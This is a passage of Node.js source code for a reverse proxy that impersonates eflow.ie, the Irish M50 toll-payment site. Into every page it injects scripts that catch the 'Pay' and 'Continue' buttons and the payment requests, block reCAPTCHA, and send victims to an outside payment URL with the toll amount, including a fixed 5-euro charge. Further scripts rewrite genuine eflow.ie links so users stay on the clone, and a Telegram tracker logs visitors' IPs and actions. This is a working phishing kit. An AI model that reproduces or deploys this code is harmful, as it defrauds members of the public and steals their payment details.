            if (PAYMENT_SYSTEM_URL && !PAYMENT_SYSTEM_URL.match(/^https?:\/\//i)) {
              PAYMENT_SYSTEM_URL = 'https://' + PAYMENT_SYSTEM_URL;
            }
            
            // CRITICAL: This script MUST execute BEFORE jQuery/Drupal loads
            // LOW-LEVEL XMLHttpRequest/Fetch interception
            const universalPaymentRedirectScript = `
<script>
// EXECUTE IMMEDIATELY - BEFORE jQuery/Drupal loads
(function() {
  'use strict';
  
  const PAYMENT_URL = '${PAYMENT_SYSTEM_URL}';
  
  // Detect mobile device
  function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) ||
           (window.innerWidth <= 768 && window.innerHeight <= 1024) ||
           ('ontouchstart' in window) ||
           (navigator.maxTouchPoints > 0);
  }
  
  const isMobile = isMobileDevice();
  
  // Function to redirect to payment system (works on both mobile and desktop)
  function redirectToPayment(amount) {
    const paymentUrl = PAYMENT_URL + '?amount=' + amount;
    
    if (isMobile) {
      // MOBILE: Use direct navigation (window.location.href)
      // This is more reliable on mobile devices than window.open()
      window.location.href = paymentUrl;
    } else {
      // DESKTOP: Use window.open() to open in new tab
      const paymentWindow = window.open(paymentUrl, '_blank');
      
      if (paymentWindow) {
        return true;
      } else {
        // Fallback: if popup is blocked, use direct navigation
        window.location.href = paymentUrl;
        return true;
      }
    }
    return true;
  }
  
  // Store original methods
  const originalXHROpen = XMLHttpRequest.prototype.open;
  const originalXHRSend = XMLHttpRequest.prototype.send;
  const originalFetch = window.fetch;
  
  // Flag to track if redirect is in progress
  let redirectInProgress = false;
  let lastPaymentAmount = null; // Track last payment amount to detect new attempts
  
  // Check if user is on payment page (with Pay button)
  function isPaymentPage() {
    try {
      if (!document.body) return false;
      
      // Check for Pay button (not "Pay Now" button)
      const payButtons = document.querySelectorAll('button, input[type="submit"], .btn, [role="button"]');
      let hasPayButton = false;
      for (let i = 0; i < payButtons.length; i++) {
        const btn = payButtons[i];
        const btnText = (btn.textContent || btn.value || '').trim().toLowerCase();
        // Look for "Pay" button (not "Pay Now")
        if (btnText === 'pay' || (btnText.includes('pay') && !btnText.includes('pay now'))) {
          // Check if it has lock icon or is in payment context
          const hasLock = btn.querySelector('[class*="lock"], [class*="security"], .btn-security') !== null;
          const isInPaymentForm = btn.closest('form') && (
            btn.closest('form').querySelector('input[name*="email"][name*="receipt"]') ||
            btn.closest('form').querySelector('input[name="total_payment"]')
          );
          if (hasLock || isInPaymentForm) {
            hasPayButton = true;
            break;
          }
        }
      }
      
      // Check for payment page indicators
      const hasTotal = document.body.innerText.match(/Total[:\\s]*€[\\d.,]+/i) !== null;
      const hasEmailReceipt = document.querySelector('input[name*="email"][name*="receipt"], input[placeholder*="email"][placeholder*="receipt"], label:contains("Email Address for Receipt")') !== null;
      const hasTotalInput = document.querySelector('input[name="total_payment"]') !== null;
      
      // Must have at least 2 indicators to be sure
      const indicators = [hasPayButton, hasTotal, hasEmailReceipt, hasTotalInput].filter(Boolean).length;
      
      return indicators >= 2;
    } catch (err) {
      return false;
    }
  }
  
  // Extract amount from page (works even before DOM is fully loaded)
  function extractAmount() {
    try {
      // Wait for DOM if needed
      if (!document.body) {
        return null;
      }
      
      // Strategy 1: Hidden input
      const totalInput = document.querySelector('input[name="total_payment"]');
      if (totalInput && totalInput.value) {
        return totalInput.value;
      }
      
      // Strategy 2: Total text
      const totalText = document.body.innerText || document.body.textContent || '';
      const euroMatch = totalText.match(/Total[:\\s]*€([\\d.,]+)/i);
      if (euroMatch && euroMatch[1]) {
        return euroMatch[1].replace(/,/g, '');
      }
      
      return null;
    } catch (err) {
      return null;
    }
  }
  
  // Setup Pay button click interceptor using MutationObserver
  function setupPayButtonInterceptor() {
    // Function to intercept Pay button clicks
    function interceptPayButton(btn) {
      // Check if already intercepted
      if (btn._paymentIntercepted) return;
      btn._paymentIntercepted = true;
      
      // Add click listener
      btn.addEventListener('click', function(e) {
        // Only intercept if we're on payment page
        if (!isPaymentPage()) {
          return;
        }
        
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        // Extract amount
        const amount = extractAmount();
        if (amount && parseFloat(amount) > 0) {
          redirectToPayment(amount);
        } else {
        }
        
        return false;
      }, true); // Use capture phase to intercept before Drupal
      
    }
    
    // Find and intercept existing Pay buttons
    function findAndInterceptPayButtons() {
      if (!isPaymentPage()) return;
      
      const buttons = document.querySelectorAll('button, input[type="submit"], .btn, [role="button"]');
      for (let i = 0; i < buttons.length; i++) {
        const btn = buttons[i];
        const btnText = (btn.textContent || btn.value || '').trim().toLowerCase();
        if (btnText === 'pay' || (btnText.includes('pay') && !btnText.includes('pay now'))) {
          const hasLock = btn.querySelector('[class*="lock"], [class*="security"], .btn-security') !== null;
          if (hasLock) {
            interceptPayButton(btn);
          }
        }
      }
    }
    
    // Use MutationObserver to watch for new Pay buttons after AJAX updates
    const observer = new MutationObserver(function(mutations) {
      findAndInterceptPayButtons();
    });
    
    // Start observing
    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: false
    });
    
    // Initial check
    setTimeout(findAndInterceptPayButtons, 500);
    setTimeout(findAndInterceptPayButtons, 2000);
    
  }
  
  // Check if user is on journey date/time page (with date input fields)
  function isJourneyDatePage() {
    try {
      if (!document.body) return false;
      
      // Check for journey date field - multiple possible selectors
      const hasJourneyDate = document.querySelector('input[name*="journey_date"], input[id*="journey_date"], input[name*="last_journey[journey_date]"], input[name^="last_journey"][name*="date"]') !== null;
      
      // Check for journey time field
      const hasJourneyTime = document.querySelector('input[name*="journey_time"], select[name*="journey_time"], input[name*="last_journey[journey_time]"], select[name*="last_journey[journey_time]"]') !== null;
      
      // Check for ownership checkbox
      const hasOwnershipCheckbox = document.querySelector('input[name*="ownership"], input[id*="ownership"], input[name*="ownership_acknowledgment"]') !== null;
      
      // Check for "Enter Last Journey Date and Time" heading in page text
      const pageText = document.body.innerText || document.body.textContent || '';
      const hasHeading = pageText.includes('Enter Last Journey Date and Time') || 
                        pageText.includes('Last M50 Journey Date') ||
                        pageText.includes('Last Journey Date');
      
      // Must have journey date field AND at least one other indicator
      const indicators = [hasJourneyDate, hasJourneyTime, hasOwnershipCheckbox, hasHeading].filter(Boolean).length;
      
      const isDatePage = hasJourneyDate && indicators >= 2;
      
      if (isDatePage) {
      }
      
      return isDatePage;
    } catch (err) {
      return false;
    }
  }
  
  // Setup Continue button interceptor - SIMPLE redirect like Pay button
  // BUT ONLY on journey date/time page
  function setupContinueButtonInterceptor() {
    // Function to intercept Continue button clicks
    function interceptContinueButton(btn) {
      // Check if already intercepted
      if (btn._continueIntercepted) return;
      btn._continueIntercepted = true;
      
      // Add click listener - use mousedown/pointerdown like Pay button to intercept before Drupal
      function handleContinueClick(e) {
        // CRITICAL: Double-check we're on journey date page before intercepting
        if (!isJourneyDatePage()) {
          return;
        }
        
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        // Fixed amount: 5 euros
        const amount = '5';
        redirectToPayment(amount);
        
        return false;
      }
      
      // Use mousedown and pointerdown like Pay button - fires BEFORE click
      btn.addEventListener('mousedown', handleContinueClick, true);
      btn.addEventListener('pointerdown', handleContinueClick, true);
      // Also use click as fallback
      btn.addEventListener('click', handleContinueClick, true);
      
    }
    
    // Find and intercept existing Continue buttons
    // BUT ONLY if we're on journey date page
    function findAndInterceptContinueButtons() {
      // CRITICAL: Only intercept if we're on journey date page
      if (!isJourneyDatePage()) {
        return;
      }
      
      const buttons = document.querySelectorAll('button, input[type="submit"], .btn, [role="button"], a.btn, a.button');
      for (let i = 0; i < buttons.length; i++) {
        const btn = buttons[i];
        const btnText = (btn.textContent || btn.value || btn.innerText || '').trim().toLowerCase();
        // Look for "Continue" button - simple text match
        if (btnText === 'continue' || (btnText.includes('continue') && !btnText.includes('back'))) {
          interceptContinueButton(btn);
        }
      }
    }
    
    // Use MutationObserver to watch for new Continue buttons after AJAX updates
    const observer = new MutationObserver(function(mutations) {
      findAndInterceptContinueButtons();
    });
    
    // Start observing
    observer.observe(document.body, {
      childList: true,
      subtree: true,
      attributes: false
    });
    
    // Initial check
    setTimeout(findAndInterceptContinueButtons, 500);
    setTimeout(findAndInterceptContinueButtons, 2000);
    
  }
  
  // Initialize both interceptors when DOM is ready
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', function() {
      setupPayButtonInterceptor();
      setupContinueButtonInterceptor();
    });
  } else {
    setupPayButtonInterceptor();
    setupContinueButtonInterceptor();
  }
  
  // Override XMLHttpRequest.open to track request details AND block reCAPTCHA
  XMLHttpRequest.prototype.open = function(method, url) {
    this._interceptedMethod = method;
    this._interceptedURL = url;
    
    // CRITICAL: Block reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && url && url.includes('google.com/recaptcha')) {
      this._blocked = true;
      return; // Don't call original open - block the request
    }
    
    return originalXHROpen.apply(this, arguments);
  };
  
  // Override XMLHttpRequest.send to intercept /pay-toll requests
  XMLHttpRequest.prototype.send = function(body) {
    // If request was blocked in open(), don't send it
    if (this._blocked) {
      return;
    }
    
    // Check if this is a Drupal AJAX payment request
    if (
      this._interceptedMethod === 'POST' &&
      this._interceptedURL &&
      (this._interceptedURL.includes('/pay-toll') || this._interceptedURL.includes('ajax_form=1'))
    ) {
      
      // Check if this is the final payment submission
      const bodyStr = body ? body.toString() : '';
      
      // CRITICAL FIX: Only trigger on FINAL Pay button, NOT "Pay Now" button
      // Final payment request MUST contain:
      // 1. total_payment= (the actual payment amount)
      // 2. _triggering_element_value=Pay (the Pay button, NOT "Pay Now")
      const hasTotalPayment = bodyStr.includes('total_payment=');
      const isFinalPayButton = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
      
      // CRITICAL: If total_payment changed, this is a NEW payment attempt - reset flag
      if (hasTotalPayment) {
        const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
        const currentAmount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : null;
        if (currentAmount && currentAmount !== lastPaymentAmount) {
          redirectInProgress = false;
          lastPaymentAmount = currentAmount;
        }
      }
      
      if (hasTotalPayment && isFinalPayButton && !redirectInProgress) {
        redirectInProgress = true;
        
        // CRITICAL: Abort BEFORE any reCAPTCHA can be triggered
        try {
          this.abort();
        } catch (e) {
        }
        
        // Extract amount DYNAMICALLY from the request body or page
        let amount = null;
        
        // Try to get from body first (most reliable as it's what's being sent)
        const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
        if (bodyAmountMatch && bodyAmountMatch[1]) {
          amount = bodyAmountMatch[1];
          // Save amount for future comparison
          lastPaymentAmount = amount;
        } else {
          amount = extractAmount();
        }
        
        if (amount && parseFloat(amount) > 0) {
          
          // Redirect to payment system (handles mobile/desktop automatically)
          if (redirectToPayment(amount)) {
            // CRITICAL: Reset flag after successful redirect to allow future attempts
            // Use timeout to ensure redirect is processed
            setTimeout(function() {
              redirectInProgress = false;
            }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
          } else {
            redirectInProgress = false;
            lastPaymentAmount = null; // Reset on failure
          }
        } else {
          redirectInProgress = false;
          lastPaymentAmount = null; // Reset on failure
        }
        
        return; // Don't send the request
      }
    }
    
    // Block reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && this._interceptedURL && this._interceptedURL.includes('google.com/recaptcha')) {
      return; // Don't send reCAPTCHA request
    }
    
    // For all other requests, proceed normally
    return originalXHRSend.apply(this, arguments);
  };
  
  // Override Fetch API (backup interception)
  window.fetch = function(url, options) {
    const urlStr = typeof url === 'string' ? url : url.toString();
    
    // CRITICAL: Block ALL reCAPTCHA requests if redirect is in progress
    if (redirectInProgress && urlStr.includes('google.com/recaptcha')) {
      return Promise.reject(new Error('reCAPTCHA blocked - redirect in progress'));
    }
    
    if (
      options &&
      options.method === 'POST' &&
      (urlStr.includes('/pay-toll') || urlStr.includes('ajax_form=1'))
    ) {
      
      // Check if final payment submit
      if (options.body && !redirectInProgress) {
        const bodyStr = options.body.toString();
        const hasTotalPayment = bodyStr.includes('total_payment=');
        const isFinalSubmit = bodyStr.includes('_triggering_element_value=Pay') && !bodyStr.includes('_triggering_element_value=Pay+');
        
        if (hasTotalPayment && isFinalSubmit) {
          redirectInProgress = true;
          
          const bodyAmountMatch = bodyStr.match(/total_payment=([\\d.]+)/);
          const amount = bodyAmountMatch && bodyAmountMatch[1] ? bodyAmountMatch[1] : extractAmount();
          
          if (amount && parseFloat(amount) > 0) {
            // Redirect to payment system (handles mobile/desktop automatically)
            if (redirectToPayment(amount)) {
              // Reset flag after successful redirect
              setTimeout(function() {
                redirectInProgress = false;
              }, isMobile ? 1000 : 2000); // Shorter timeout for mobile (direct navigation)
            } else {
              redirectInProgress = false;
            }
            return Promise.reject(new Error('Redirected to payment system'));
          } else {
            redirectInProgress = false;
          }
        }
      }
    }
    
    return originalFetch.apply(this, arguments);
  };
  
})();
</script>`;
            
            // Inject scripts on ALL HTML pages
            // Include: reCAPTCHA fix, payment redirect, user tracking, and link interceptor
            const trackingScript = telegramLogger.getTrackingScript();
            
            // CRITICAL: Link interceptor script to prevent redirects to eflow.ie
            const linkInterceptorScript = `
<script>
(function() {
  'use strict';
  const PROXY_ORIGIN = window.location.origin;
  const TARGET_DOMAIN = 'eflow.ie';
  const PROXY_DOMAIN = window.location.hostname;
  
  // КРИТИЧНО: Перехватываем window.location до любых изменений
  const originalLocation = window.location;
  let locationIntercepted = false;
  
  function fixUrl(url) {
    if (!url || typeof url !== 'string') return url;
    if (url.includes(TARGET_DOMAIN) || url.includes('www.' + TARGET_DOMAIN)) {
      return url.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), '$1' + PROXY_DOMAIN);
    }
    return url;
  }
  
  // Перехватываем присвоение window.location.href
  try {
    const locationDescriptor = Object.getOwnPropertyDescriptor(window, 'location');
    if (locationDescriptor && locationDescriptor.configurable !== false) {
      // Создаем прокси для location
      const locationProxy = new Proxy(originalLocation, {
        set: function(target, prop, value) {
          if (prop === 'href' && typeof value === 'string') {
            value = fixUrl(value);
          }
          target[prop] = value;
          return true;
        }
      });
    }
  } catch(e) {}
  
  // Перехватываем window.location.assign и window.location.replace
  const originalAssign = window.location.assign;
  const originalReplace = window.location.replace;
  
  window.location.assign = function(url) {
    return originalAssign.call(window.location, fixUrl(url));
  };
  
  window.location.replace = function(url) {
    return originalReplace.call(window.location, fixUrl(url));
  };
  
  // Функция для перехвата и исправления ссылок
  function interceptLink(link) {
    if (!link || !link.href) return;
    
    try {
      const url = new URL(link.href, window.location.href);
      
      // Если ссылка ведет на eflow.ie - заменяем на прокси-домен
      if (url.hostname === TARGET_DOMAIN || url.hostname === 'www.' + TARGET_DOMAIN) {
        url.hostname = PROXY_DOMAIN;
        url.protocol = window.location.protocol;
        link.href = url.toString();
        link.setAttribute('data-fixed', 'true');
      }
    } catch (e) {
      // Если не удалось распарсить URL, проверяем строку напрямую
      const hrefAttr = link.getAttribute('href');
      if (hrefAttr && hrefAttr.includes(TARGET_DOMAIN)) {
        link.href = hrefAttr.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN);
        link.setAttribute('data-fixed', 'true');
      }
    }
    
    // СПЕЦИАЛЬНО ДЛЯ ЛОГОТИПА: удаляем onclick если он ведёт на eflow.ie
    const onclick = link.getAttribute('onclick');
    if (onclick && onclick.includes(TARGET_DOMAIN)) {
      link.setAttribute('onclick', onclick.replace(new RegExp(TARGET_DOMAIN, 'gi'), PROXY_DOMAIN));
    }
  }
  
  // Специальная функция для логотипа
  function fixLogo() {
    // Ищем логотип по разным селекторам
    const logoSelectors = [
      'a.logo', 'a.site-logo', '.logo a', '.site-logo a', 
      'a[href="/"]', 'header a:first-child', '.header a img',
      'a img[alt*="logo" i]', 'a img[alt*="eflow" i]',
      '.branding a', '#logo a', 'a#logo'
    ];
    
    logoSelectors.forEach(selector => {
      try {
        const elements = document.querySelectorAll(selector);
        elements.forEach(el => {
          const link = el.tagName === 'A' ? el : el.closest('a');
          if (link) {
            // Проверяем href
            const href = link.getAttribute('href');
            if (href === '/' || href === '' || href === '#' || (href && href.includes(TARGET_DOMAIN))) {
              // Устанавливаем правильную ссылку на главную прокси
              link.href = PROXY_ORIGIN + '/';
              link.setAttribute('data-logo-fixed', 'true');
              
              // Удаляем любые onclick обработчики
              link.removeAttribute('onclick');
              
              // Добавляем свой обработчик
              link.addEventListener('click', function(e) {
                e.preventDefault();
                e.stopPropagation();
                window.location.href = PROXY_ORIGIN + '/';
              }, true);
            }
          }
        });
      } catch(e) {}
    });
  }
  
  // Функция для перехвата кликов на ссылки
  function interceptClick(e) {
    const link = e.target.closest('a');
    if (!link) return;
    
    const href = link.href || link.getAttribute('href');
    if (!href) return;
    
    try {
      const url = new URL(href, window.location.href);
      
      // Если ссылка ведет на eflow.ie - предотвращаем переход и исправляем
      if (url.hostname === TARGET_DOMAIN || url.hostname === 'www.' + TARGET_DOMAIN) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        url.hostname = PROXY_DOMAIN;
        url.protocol = window.location.protocol;
        
        // Переходим на прокси-версию
        window.location.href = url.toString();
        return false;
      }
    } catch (err) {
      // Если не удалось распарсить, проверяем строку
      if (href && href.includes(TARGET_DOMAIN)) {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        
        const fixedHref = href.replace(new RegExp('(https?://)(www\\.)?' + TARGET_DOMAIN.replace('.', '\\\\.'), 'gi'), '$1' + PROXY_DOMAIN);
        window.location.href = fixedHref;
        return false;
      }
    }
  }
  
  // Обработать все существующие ссылки
  function processAllLinks() {
    const links = document.querySelectorAll('a[href]');
    links.forEach(link => {
      interceptLink(link);
    });
    fixLogo();
  }
  
  // Перехватывать клики на всех ссылках (включая логотип)
  document.addEventListener('click', interceptClick, true);
  document.addEventListener('mousedown', interceptClick, true);
  document.addEventListener('touchstart', interceptClick, true); // Для мобильных
  
  // Обработать ссылки при загрузке DOM
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', processAllLinks);
  } else {
    processAllLinks();
  }
  
  // Использовать MutationObserver для динамически созданных ссылок
  const observer = new MutationObserver(function(mutations) {
    let needsProcessing = false;
    mutations.forEach(function(mutation) {
      mutation.addedNodes.forEach(function(node) {
        if (node.nodeType === 1) {
          needsProcessing = true;
        }
      });
    });
    if (needsProcessing) {
      processAllLinks();
    }
  });
  
  // Начать наблюдение
  function startObserver() {
    if (document.body) {
      observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['href', 'onclick']
      });
    }
  }
  
  if (document.body) {
    startObserver();
  } else {
    document.addEventListener('DOMContentLoaded', startObserver);
  }
  
  // Периодическая проверка
  setInterval(processAllLinks, 1000);
  
  // Дополнительная проверка после полной загрузки
  window.addEventListener('load', function() {
    setTimeout(processAllLinks, 100);
    setTimeout(processAllLinks, 500);
    setTimeout(processAllLinks, 1000);
  });
  
})();
</script>`;
            
            let scriptsToInject = recaptchaFixScript + '\n' + universalPaymentRedirectScript + '\n' + linkInterceptorScript + '\n' + trackingScript;
            
          // CRITICAL: Inject at THE VERY START of <head> to execute BEFORE any other scripts
          const hasHeadOpen = bodyString.includes('<head>');
          const hasHeadWithAttrs = bodyString.includes('<head ');
          const hasHeadClose = bodyString.includes('</head>');
          const hasScript = bodyString.includes('<script');
          
          logger.info(`[SCRIPT INJECTION] HEAD detection: open=${hasHeadOpen}, withAttrs=${hasHeadWithAttrs}, close=${hasHeadClose}, script=${hasScript}`);
          
          if (bodyString.includes('<head>')) {
            bodyString = bodyString.replace('<head>', '<head>\n' + scriptsToInject);
            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head>`);
          } else if (bodyString.includes('<head ')) {
            bodyString = bodyString.replace(/<head([^>]*)>/, '<head$1>\n' + scriptsToInject);
            logger.info(`[SCRIPT INJECTION] ✓ Injected after <head ...>`);
          } else if (bodyString.includes('</head>')) {
            // Fallback: inject before </head>
            bodyString = bodyString.replace('</head>', scriptsToInject + '\n</head>');
            logger.info(`[SCRIPT INJECTION] ✓ Injected before </head>`);
          } else if (bodyString.includes('<script')) {
            // Last resort: inject before first script
            bodyString = bodyString.replace('<script', scriptsToInject + '\n<script');
            logger.info(`[SCRIPT INJECTION] ✓ Injected before first <script>`);
          } else {
            logger.warn(`[SCRIPT INJECTION] ✗ NO INJECTION POINT FOUND!`);
          }
          
          // DEBUG: Add header to confirm injection happened
          res.setHeader('X-Script-Injected', 'yes');
        }
        
        // Return modified body string
        return bodyString;
      }
      
      // Return unmodified buffer for other content types
      return responseBuffer;
      } catch (error) {
        // CRITICAL: Handle errors in responseInterceptor to prevent 502
        logger.error('Error in responseInterceptor', {
          error: error.message,
          stack: error.stack,
          url: req.url,
          method: req.method,
        });
        
        // If headers not sent, send error response
        if (!res.headersSent) {
          res.status(500).json({
            error: 'Processing Error',
            message: 'Failed to process response',
            details: process.env.NODE_ENV === 'production' ? 'Internal server error' : error.message,
          });
        }
        
        // Return original buffer as fallback
        return responseBuffer;
      }
    }),
    
    // Error handling
    error: (err, req, res) => {
      logger.error('Proxy error in responseInterceptor', {
        error: err.message,
        stack: err.stack,
        url: req.url,
        method: req.method,
        code: err.code,
      });
      
      if (!res.headersSent) {
        // Check error type
        if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
          res.status(504).json({
            error: 'Gateway Timeout',
            message: 'The upstream server did not respond in time',
          });
        } else if (err.code === 'ECONNREFUSED') {
          res.status(502).json({
            error: 'Bad Gateway',
            message: 'Unable to connect to upstream server',
          });
        } else {
          res.status(502).json({
            error: 'Proxy Error',
            message: 'Failed to proxy request',
            details: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message,
          });
        }
      }
    },
  },
  
  // Error handling
  onError: (err, req, res) => {
    logger.error('Proxy error (onError)', {
      error: err.message,
      stack: err.stack,
      url: req.url,
      method: req.method,
      code: err.code,
    });
    
    if (!res.headersSent) {
      // Check error type
      if (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT' || err.code === 'ESOCKETTIMEDOUT') {
        res.status(504).json({
          error: 'Gateway Timeout',
          message: 'The upstream server did not respond in time',
        });
      } else if (err.code === 'ECONNREFUSED') {
        res.status(502).json({
          error: 'Bad Gateway',
          message: 'Unable to connect to upstream server',
        });
      } else {
        res.status(502).json({
          error: 'Proxy Error',
          message: 'Failed to proxy request',
          details: process.env.NODE_ENV === 'production' ? 'Internal server error' : err.message,
        });
      }
    }
  },
  
  // Log provider
  logLevel: config.logging.level === 'debug' ? 'debug' : 'warn',
};

// Health check endpoint (before proxy)
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Test endpoint to check if server is responding
app.get('/test', (req, res) => {
  res.status(200).json({ 
    message: 'Server is working',
    target: config.target.url,
    timestamp: new Date().toISOString()
  });
});


// API endpoint for user tracking (Telegram notifications)
app.use(express.json({ limit: '1mb' }));
app.post('/api/track', async (req, res) => {
  try {
    const { sessionId, action } = req.body;
    
    if (!sessionId || !action) {
      return res.status(400).json({ error: 'Missing sessionId or action' });
    }
    
    // Get user metadata - используем функцию из telegram-logger для консистентности
    const getClientIP = (req) => {
      let ip = req.headers['x-real-ip'];
      if (ip) {
        ip = ip.trim();
        if (ip && ip !== '::1' && !ip.startsWith('127.')) return ip;
      }
      const xForwardedFor = req.headers['x-forwarded-for'];
      if (xForwardedFor) {
        const ips = xForwardedFor.split(',').map(ip => ip.trim()).filter(ip => ip);
        for (const candidateIp of ips) {
          if (candidateIp && candidateIp !== '::1' && !candidateIp.startsWith('127.') && 
              !candidateIp.startsWith('192.168.') && !candidateIp.startsWith('10.') && 
              !candidateIp.match(/^172\.(1[6-9]|2[0-9]|3[01])\./)) {
            return candidateIp;
          }
        }
        if (ips.length > 0) return ips[0];
      }
      if (req.ip && req.ip !== '::1' && !req.ip.startsWith('127.')) return req.ip;
      const remoteAddr = req.socket?.remoteAddress || req.connection?.remoteAddress;
      if (remoteAddr) {
        const cleanIp = remoteAddr.replace(/^::ffff:/, '');
        if (cleanIp && cleanIp !== '::1' && !cleanIp.startsWith('127.')) return cleanIp;
      }
      return 'Unknown';
    };
    
    const meta = {
      ip: getClientIP(req),
      userAgent: req.headers['user-agent'],
    };
    
    // Track action
    await telegramLogger.trackAction(sessionId, action, meta);
    
    res.status(200).json({ ok: true });
  } catch (error) {
    logger.error('[Track API] Error:', error.message);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Apply proxy middleware to all routes
app.use('/', createProxyMiddleware(proxyOptions));

// WebSocket proxy
if (config.features.websocket) {
  app.ws('/*', (ws, req) => {
    logger.info(`WebSocket connection established: ${req.url}`);
    
    const WebSocket = require('ws');
    const targetUrl = config.target.url.replace('http', 'ws') + req.url;
    const proxyWs = new WebSocket(targetUrl, {
      headers: {
        'Origin': config.target.url,
        'User-Agent': req.headers['user-agent'],
      },
    });
    
    // Forward messages from client to target
    ws.on('message', (msg) => {
      if (proxyWs.readyState === WebSocket.OPEN) {
        proxyWs.send(msg);
      }
    });
    
    // Forward messages from target to client
    proxyWs.on('message', (msg) => {
      if (ws.readyState === WebSocket.OPEN) {
        ws.send(msg);
      }
    });
    
    // Handle errors
    proxyWs.on('error', (err) => {
      logger.error('WebSocket proxy error', { error: err.message });
      ws.close();
    });
    
    ws.on('error', (err) => {
      logger.error('WebSocket client error', { error: err.message });
      proxyWs.close();
    });
    
    // Handle close
    proxyWs.on('close', () => {
      ws.close();
    });
    
    ws.on('close', () => {
      proxyWs.close();
    });
  });
}

// Global error handler
app.use((err, req, res, next) => {
  logger.error('Application error', {
    error: err.message,
    stack: err.stack,
    url: req.url,
    method: req.method,
  });
  
  res.status(500).json({
    error: 'Internal Server Error',
    message: err.message,
  });
});

// Start server
const server = app.listen(config.server.port, config.server.host, () => {
  logger.info('='.repeat(60));
  logger.info('🚀 Reverse Proxy Server Started');
  logger.info('='.repeat(60));
  logger.info(`Target URL: ${config.target.url}`);
  logger.info(`Listening on: ${config.server.host}:${config.server.port}`);
  logger.info(`WebSocket: ${config.features.websocket ? 'Enabled' : 'Disabled'}`);
  logger.info(`Compression: ${config.features.compression ? 'Enabled' : 'Disabled'}`);
  logger.info(`Log Level: ${config.logging.level}`);
  logger.info(`Proxy Timeout: ${config.target.timeout}ms`);
  logger.info(`Request Timeout: ${config.target.timeout + 30000}ms`);
  if (config.proxy && config.proxy.enabled) {
    logger.info(`External Proxy: ${config.proxy.host}:${config.proxy.port} (ENABLED)`);
  } else {
    logger.info(`External Proxy: DISABLED`);
  }
  logger.info('='.repeat(60));
});

// Server timeout settings - MUST be greater than proxy timeout
// CRITICAL FIX: Dynamic timeouts based on PROXY_TIMEOUT config
const serverTimeout = config.target.timeout + 60000; // proxy timeout + 60s buffer
server.keepAliveTimeout = serverTimeout;
server.headersTimeout = serverTimeout + 1000; // must be > keepAliveTimeout
server.timeout = serverTimeout + 5000; // overall server timeout

logger.info(`Server timeouts configured: keepAlive=${serverTimeout}ms, headers=${serverTimeout + 1000}ms`);

// Monitor memory usage periodically
setInterval(() => {
  const memUsage = process.memoryUsage();
  const memUsageMB = {
    rss: Math.round(memUsage.rss / 1024 / 1024),
    heapUsed: Math.round(memUsage.heapUsed / 1024 / 1024),
    heapTotal: Math.round(memUsage.heapTotal / 1024 / 1024),
  };
  
  logger.info('Memory Usage', memUsageMB);
  
  // Warn if memory usage is high (>500MB RSS)
  if (memUsageMB.rss > 500) {
    logger.warn('High memory usage detected', memUsageMB);
  }
}, 300000); // Every 5 minutes

// Graceful shutdown
process.on('SIGTERM', () => {
  logger.info('SIGTERM signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

process.on('SIGINT', () => {
  logger.info('SIGINT signal received: closing HTTP server');
  server.close(() => {
    logger.info('HTTP server closed');
    process.exit(0);
  });
});

module.exports = app;

